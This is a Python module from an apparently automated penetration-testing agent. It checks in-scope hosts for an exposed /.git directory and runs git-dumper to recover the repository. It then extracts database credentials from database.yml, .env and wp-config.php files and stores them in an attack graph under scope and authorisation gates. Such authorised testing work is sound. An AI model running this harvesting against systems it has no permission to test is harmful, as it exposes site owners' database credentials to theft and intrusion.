# agent_alpha/recon/git_exposure_probe.py
"""Exposed ``/.git`` leak-source recon — wraps a commodity git-dumper.

Phase 4 recon vector, parallel to ``wp_config_probe`` and ``js_secret_probe``.

Control flow (per tests/phase_4/test_git_exposure_probe.py):

  1. Tier gate: engagement state >= RECON_ONLY (fail-closed).
  2. Scope gate: never probe an out-of-scope host.
  3. GET ``https://{host}/.git/config`` and classify via ``response_classifier``.
     - Verdict.BLOCKED -> emit EventType.WAF_BLOCKED and DO NOT dump.
     - verdict != OK or body not a git config (no "[core]") -> not exposed, DO NOT dump.
  4. Exposed -> ``dumper.dump(f"https://{host}/")`` (wrapped git-dumper).
  5. ``_extract_secrets`` turns recovered files (database.yml / .env / wp-config.php)
     into a canonical leaked dict keyed like the WordPress path (DB_USER, DB_PASSWORD,
     DB_NAME, DB_HOST).
  6. Empty leaked dict -> no credential (exposure alone is not payable).
  7. Non-empty leaked dict -> persist ASSET + VULNERABILITY nodes, then delegate to the
     shared ``assemble_leaked_credentials`` seam to mint VAULTED credentials under the
     "git_exposure" leak_source.

No new credential type, no new vault path, no new classifier.
"""

from __future__ import annotations

import datetime
import shutil
import subprocess  # nosec B404 — commodity tool WRAP (git-dumper)
import tempfile
from pathlib import Path
from typing import Any, Protocol, runtime_checkable

from agent_alpha.a2a import a2a_pb2
from agent_alpha.conductor.authorization import STATE_RANK
from agent_alpha.config import constants
from agent_alpha.events.event_types import EventType
from agent_alpha.graph.nodes import (
    AssetProperties,
    AttackEdge,
    AttackNode,
    NodeType,
    RelationshipType,
    VulnerabilityProperties,
    node_to_dict,
)
from agent_alpha.recon.response_classifier import Verdict, classify_response
from agent_alpha.recon.wp_config_probe import parse_wp_config
from agent_alpha.security.credential_assembly import assemble_leaked_credentials

# ── Credential key maps for git-sourced leaks (database.yml / .env / wp-config.php) ────
# Canonicalised to the same DB_* key space as the WordPress wp-config path so we can
# reuse the existing pairing + standalone + service mapping logic.
GIT_CREDENTIAL_LOGIN_PAIRS: dict[str, tuple[str, str]] = constants.WP_CREDENTIAL_LOGIN_PAIRS
GIT_CREDENTIAL_USERNAME_KEYS: frozenset[str] = constants.WP_CREDENTIAL_USERNAME_KEYS
GIT_CREDENTIAL_SECRET_KEYS: frozenset[str] = constants.WP_CREDENTIAL_SECRET_KEYS
GIT_CREDENTIAL_SERVICE_MAP: dict[str, str] = constants.WP_CREDENTIAL_SERVICE_MAP


@runtime_checkable
class HttpClientProtocol(Protocol):
    """Minimal HTTP client interface for recon GET requests."""

    def get(
        self,
        url: str,
        *,
        headers: dict[str, str] | None = None,
        cookies: dict[str, str] | None = None,
    ) -> Any: ...


@runtime_checkable
class GitDumperProtocol(Protocol):
    """Interface for the wrapped commodity git-dumper.

    Implementations MUST:
      - Perform a read-only dump of the git repository rooted at *base_url*.
      - Return a mapping of ``{path: content}`` for recovered tracked files.
    """

    def dump(self, base_url: str) -> dict[str, str]: ...


class _NoopGitDumper:
    """Placeholder dumper used when no real git-dumper integration is configured.

    The Phase 4 tests always inject a fake dumper; production wiring is expected to
    replace this with a real wrapper around the chosen git-dumper tool.
    """

    def dump(self, base_url: str) -> dict[str, str]:  # noqa: ARG002
        raise RuntimeError("Git dumper integration not configured")


class GitDumper:
    """Commodity WRAP of the git-dumper tool (ADR §12.22).

    Shells out to git-dumper to recover tracked files from an exposed /.git over HTTP.
    Returns {relative_path: content} for all recovered files. FAIL-LOUD on any error
    or empty recovery (anti-#3).
    """

    def dump(self, base_url: str) -> dict[str, str]:
        # Check git-dumper is available
        if not shutil.which("git-dumper"):
            raise RuntimeError("git-dumper tool not found in PATH")

        # Create temp directory for the dump
        with tempfile.TemporaryDirectory() as tmpdir:
            tmp_path = Path(tmpdir)
            output_dir = tmp_path / "dumped"

            # Run git-dumper
            result = subprocess.run(  # nosec — commodity tool call with PATH check + validated input (base_url from scope_hosts)
                ["git-dumper", base_url, str(output_dir)],
                capture_output=True,
                text=True,
                timeout=300,  # 5 minute timeout for large repos
            )

            if result.returncode != 0:
                raise RuntimeError(f"git-dumper failed: {result.stderr}")

            # Read all recovered tracked files
            recovered: dict[str, str] = {}
            if not output_dir.exists():
                raise RuntimeError("git-dumper produced no output directory")

            for file_path in output_dir.rglob("*"):
                if file_path.is_file():
                    # Get relative path from output_dir
                    rel_path = file_path.relative_to(output_dir)
                    try:
                        content = file_path.read_text(encoding="utf-8", errors="ignore")
                        recovered[str(rel_path)] = content
                    except Exception:
                        # Skip files that can't be read, but don't fail entirely
                        continue

            if not recovered:
                raise RuntimeError("git-dumper recovered no files")

            return recovered


def _default_git_dumper() -> GitDumperProtocol:
    return GitDumper()


def verify_git_exposure(
    *,
    engagement_id: str,
    auth: Any,  # AuthScopeView: get_state() + is_in_scope()
    http_client: HttpClientProtocol,
    scope_hosts: list[str],  # in-scope domains from scope.domains
    graph_store: Any,
    event_store: Any,
    secrets_manager: Any | None = None,
    dumper: GitDumperProtocol | None = None,
    timeout_s: float = 10.0,  # noqa: ARG001 - reserved for future use
) -> int:
    """Probe in-scope hosts for an exposed ``/.git`` that yields payable secrets.

    Returns the number of CREDENTIAL nodes added.
    """
    # ── Tier gate: fail-closed below RECON_ONLY ────────────────────────────────
    current_state = auth.get_state(engagement_id)
    if STATE_RANK.get(current_state, 0) < STATE_RANK[a2a_pb2.RECON_ONLY]:
        return 0

    if dumper is None:
        dumper = _default_git_dumper()

    creds_added = 0

    for host in scope_hosts:
        # ── Scope gate: never probe an out-of-scope host ─────────────────────
        if not auth.is_in_scope(engagement_id, host):
            continue

        config_path = "/.git/config"
        config_url = f"https://{host}{config_path}"

        # ── Cheap-first: probe config before attempting a full dump ──────────
        try:
            resp = http_client.get(config_url)
        except Exception:
            continue  # network error → skip, not a finding

        status = getattr(resp, "status_code", 0)
        body = getattr(resp, "text", "")

        verdict = classify_response(status_code=status, body=body)

        # ── WAF discriminator via canonical classifier ───────────────────────
        if verdict is Verdict.BLOCKED:
            event_store.append(
                EventType.WAF_BLOCKED,
                engagement_id,
                "alpha",
                {"host": host, "path": config_path, "status_code": status},
            )
            # Block is evidence; NEVER treated as clean / not-vulnerable.
            continue

        # Non-OK (EMPTY / TRANSPORT_FAIL) → not exposed / non-analyzable.
        if verdict is not Verdict.OK:
            continue

        # Body must look like a git config (anti-#3: random 200 page is not exposure).
        if "[core]" not in body:
            continue

        base_url = f"https://{host}/"
        try:
            recovered = dumper.dump(base_url)
        except Exception:
            # Dumper failure → treat as non-analyzable for this host.
            continue

        leaked = _extract_secrets(recovered)
        if not leaked:
            # Exposure without recoverable secret is not a payable credential.
            continue

        # ── Persist ASSET + VULNERABILITY nodes, then assemble credentials ────
        now_utc = datetime.datetime.now(datetime.UTC).replace(tzinfo=None).isoformat() + "Z"

        vuln_node_id = f"vuln:{host}:git_exposure"

        vuln_node = AttackNode(
            id=vuln_node_id,
            type=NodeType.VULNERABILITY,
            properties=VulnerabilityProperties(
                affected_service="web",
                exploit_available=False,
            ),
            confidence=0.85,
            agent="alpha",
            timestamp_utc=now_utc,
        )
        _persist_node(event_store, graph_store, engagement_id, vuln_node)

        asset_node = AttackNode(
            id=f"asset:{host}",
            type=NodeType.ASSET,
            properties=AssetProperties(
                host=host,
                tech_stack=["git"],
            ),
            confidence=0.85,
            agent="alpha",
            timestamp_utc=now_utc,
        )
        _persist_node(event_store, graph_store, engagement_id, asset_node)

        asset_edge = AttackEdge(
            source_id=asset_node.id,
            target_id=vuln_node.id,
            relationship=RelationshipType.EXPLOITS,
            confidence=0.85,
        )
        _persist_edge(event_store, graph_store, engagement_id, asset_edge)

        nodes, edges = assemble_leaked_credentials(
            leaked,
            host=host,
            vuln_node_id=vuln_node_id,
            login_pairs=GIT_CREDENTIAL_LOGIN_PAIRS,
            username_keys=GIT_CREDENTIAL_USERNAME_KEYS,
            secret_keys=GIT_CREDENTIAL_SECRET_KEYS,
            service_map=GIT_CREDENTIAL_SERVICE_MAP,
            secrets_manager=secrets_manager,
            engagement_id=engagement_id,
            now_utc=now_utc,
            leak_source="git_exposure",
        )

        for node in nodes:
            _persist_node(event_store, graph_store, engagement_id, node)
            creds_added += 1
        for edge in edges:
            _persist_edge(event_store, graph_store, engagement_id, edge)

    return creds_added


def _extract_secrets(recovered: dict[str, str]) -> dict[str, str]:
    """Extract DB-style credentials from recovered git-tracked files.

    Supports three common config formats:
      - ``config/database.yml`` (Rails-style YAML)
      - ``.env`` files with DB_* keys
      - ``wp-config.php`` checked into the repo (reusing ``parse_wp_config``)

    Returns a canonical ``{KEY: value}`` mapping in the DB_* key space expected by
    the shared credential_assembly seam.
    """
    leaked: dict[str, str] = {}

    for path, content in recovered.items():
        lower_path = path.lower()

        if lower_path.endswith("database.yml"):
            _merge_in(leaked, _extract_from_database_yml(content))
        elif lower_path.endswith(".env") or "/.env" in lower_path:
            _merge_in(leaked, _extract_from_env_file(content))
        elif "wp-config" in lower_path:
            _merge_in(leaked, parse_wp_config(content))

    return leaked


def _merge_in(target: dict[str, str], source: dict[str, str]) -> None:
    """Merge *source* into *target*, without clearing existing keys."""

    for key, value in source.items():
        target[key] = value


def _extract_from_database_yml(body: str) -> dict[str, str]:
    """Best-effort extraction from a Rails-style database.yml snippet.

    Looks for ``username:``, ``password:``, ``database:``, and ``host:`` keys,
    mapping them into the DB_* key space.
    """
    result: dict[str, str] = {}
    for line in body.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if ":" not in line:
            continue
        key, _, value = line.partition(":")
        key = key.strip().lower()
        value = value.strip()
        if not value:
            continue
        if key == "username":
            result["DB_USER"] = value
        elif key == "password":
            result["DB_PASSWORD"] = value
        elif key == "database":
            result["DB_NAME"] = value
        elif key == "host":
            result["DB_HOST"] = value
    return result


def _extract_from_env_file(body: str) -> dict[str, str]:
    """Extract DB_* keys from a .env-style file.

    Supports DB_USER / DB_USERNAME, DB_PASSWORD, DB_NAME / DB_DATABASE, DB_HOST.
    Values are normalised into the DB_* key space.
    """
    result: dict[str, str] = {}
    for line in body.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "=" not in line:
            continue
        key, _, value = line.partition("=")
        key = key.strip().upper()
        value = value.strip().strip('"').strip("'")
        if not value:
            continue
        if key in ("DB_USER", "DB_USERNAME"):
            result["DB_USER"] = value
        elif key == "DB_PASSWORD":
            result["DB_PASSWORD"] = value
        elif key in ("DB_NAME", "DB_DATABASE"):
            result["DB_NAME"] = value
        elif key == "DB_HOST":
            result["DB_HOST"] = value
    return result


def _persist_node(
    event_store: Any,
    graph_store: Any,
    engagement_id: str,
    node: AttackNode,
) -> None:
    """Persist a node through both event_store and graph_store."""
    payload = node_to_dict(node)
    event_store.append(
        EventType.NODE_DISCOVERED,
        engagement_id,
        "alpha",
        payload,
    )
    graph_store.apply_event("NodeDiscovered", payload)


def _persist_edge(
    event_store: Any,
    graph_store: Any,
    engagement_id: str,
    edge: AttackEdge,
) -> None:
    """Persist an edge through both event_store and graph_store."""
    payload = {
        "source_id": edge.source_id,
        "target_id": edge.target_id,
        "relationship": edge.relationship.value,
        "confidence": edge.confidence,
        "technique_id": edge.technique_id,
    }
    event_store.append(
        EventType.EDGE_DISCOVERED,
        engagement_id,
        "alpha",
        payload,
    )
    graph_store.apply_event("EdgeDiscovered", payload)
